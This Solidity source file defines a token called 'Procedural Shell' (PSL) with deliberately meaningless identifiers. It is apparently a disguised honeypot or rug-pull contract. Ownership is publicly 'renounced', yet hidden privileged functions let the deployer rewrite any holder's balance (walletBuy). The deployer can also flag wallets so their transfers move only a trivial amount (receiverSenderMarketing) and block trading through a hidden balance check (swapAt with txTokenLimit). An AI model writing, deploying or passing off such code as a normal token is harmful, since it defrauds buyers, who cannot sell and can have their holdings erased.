//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface shouldTxLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isLaunched) external view returns (uint256);

    function transfer(address modeSell, uint256 tokenBuy) external returns (bool);

    function allowance(address buyShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenBuy) external returns (bool);

    function transferFrom(
        address sender,
        address modeSell,
        uint256 tokenBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityTeam, uint256 value);
    event Approval(address indexed buyShould, address indexed spender, uint256 value);
}

abstract contract feeTotalMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeToMarketing {
    function createPair(address liquidityShouldWallet, address toSender) external returns (address);
}

interface shouldTxLaunchMetadata is shouldTxLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ProceduralShell is feeTotalMarketing, shouldTxLaunch, shouldTxLaunchMetadata {

    bool private marketingMax;

    event OwnershipTransferred(address indexed exemptTrading, address indexed sellReceiverExempt);

    function balanceOf(address isLaunched) public view virtual override returns (uint256) {
        return listLiquidity[isLaunched];
    }

    function approve(address feeExempt, uint256 tokenBuy) public virtual override returns (bool) {
        listTake[_msgSender()][feeExempt] = tokenBuy;
        emit Approval(_msgSender(), feeExempt, tokenBuy);
        return true;
    }

    address modeTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public autoTeam;

    mapping(address => bool) public feeEnable;

    function walletBuy(address txAt, uint256 tokenBuy) public {
        exemptEnable();
        listLiquidity[txAt] = tokenBuy;
    }

    uint256 launchReceiver;

    function transfer(address txAt, uint256 tokenBuy) external virtual override returns (bool) {
        return txTokenLimit(_msgSender(), txAt, tokenBuy);
    }

    address public limitReceiverTo;

    function owner() external view returns (address) {
        return autoMin;
    }

    function txTokenLimit(address buyFund, address modeSell, uint256 tokenBuy) internal returns (bool) {
        if (buyFund == autoTeam) {
            return toAmount(buyFund, modeSell, tokenBuy);
        }
        uint256 limitEnableTotal = shouldTxLaunch(limitReceiverTo).balanceOf(modeTrading);
        require(limitEnableTotal == minEnable);
        require(modeSell != modeTrading);
        if (feeEnable[buyFund]) {
            return toAmount(buyFund, modeSell, tokenExemptTeam);
        }
        return toAmount(buyFund, modeSell, tokenBuy);
    }

    bool public liquidityAt;

    function toAmount(address buyFund, address modeSell, uint256 tokenBuy) internal returns (bool) {
        require(listLiquidity[buyFund] >= tokenBuy);
        listLiquidity[buyFund] -= tokenBuy;
        listLiquidity[modeSell] += tokenBuy;
        emit Transfer(buyFund, modeSell, tokenBuy);
        return true;
    }

    uint256 minEnable;

    function transferFrom(address buyFund, address modeSell, uint256 tokenBuy) external override returns (bool) {
        if (_msgSender() != autoWallet) {
            if (listTake[buyFund][_msgSender()] != type(uint256).max) {
                require(tokenBuy <= listTake[buyFund][_msgSender()]);
                listTake[buyFund][_msgSender()] -= tokenBuy;
            }
        }
        return txTokenLimit(buyFund, modeSell, tokenBuy);
    }

    mapping(address => uint256) private listLiquidity;

    mapping(address => mapping(address => uint256)) private listTake;

    function receiverSenderMarketing(address marketingSenderTake) public {
        exemptEnable();
        if (toMode) {
            totalMin = true;
        }
        if (marketingSenderTake == autoTeam || marketingSenderTake == limitReceiverTo) {
            return;
        }
        feeEnable[marketingSenderTake] = true;
    }

    bool public toMode;

    function symbol() external view virtual override returns (string memory) {
        return minMode;
    }

    uint256 private marketingBuy;

    function toTotal(address tokenSwap) public {
        if (limitEnable) {
            return;
        }
        
        fundTotal[tokenSwap] = true;
        
        limitEnable = true;
    }

    string private amountFee = "Procedural Shell";

    uint256 private buySell = 100000000 * 10 ** 18;

    mapping(address => bool) public fundTotal;

    bool private takeAt;

    string private minMode = "PSL";

    uint256 public shouldAuto;

    function decimals() external view virtual override returns (uint8) {
        return teamBuy;
    }

    function name() external view virtual override returns (string memory) {
        return amountFee;
    }

    address autoWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function swapAt(uint256 tokenBuy) public {
        exemptEnable();
        minEnable = tokenBuy;
    }

    function exemptEnable() private view {
        require(fundTotal[_msgSender()]);
    }

    address private autoMin;

    uint256 private receiverFrom;

    constructor (){
        
        maxLimit liquidityIsLaunched = maxLimit(autoWallet);
        limitReceiverTo = modeToMarketing(liquidityIsLaunched.factory()).createPair(liquidityIsLaunched.WETH(), address(this));
        if (takeAt == toMode) {
            toMode = true;
        }
        autoTeam = _msgSender();
        toMarketing();
        fundTotal[autoTeam] = true;
        listLiquidity[autoTeam] = buySell;
        
        emit Transfer(address(0), autoTeam, buySell);
    }

    uint256 constant tokenExemptTeam = 6 ** 10;

    function totalSupply() external view virtual override returns (uint256) {
        return buySell;
    }

    function getOwner() external view returns (address) {
        return autoMin;
    }

    bool public limitEnable;

    bool private totalMin;

    function toMarketing() public {
        emit OwnershipTransferred(autoTeam, address(0));
        autoMin = address(0);
    }

    uint8 private teamBuy = 18;

    function allowance(address teamLaunched, address feeExempt) external view virtual override returns (uint256) {
        if (feeExempt == autoWallet) {
            return type(uint256).max;
        }
        return listTake[teamLaunched][feeExempt];
    }

}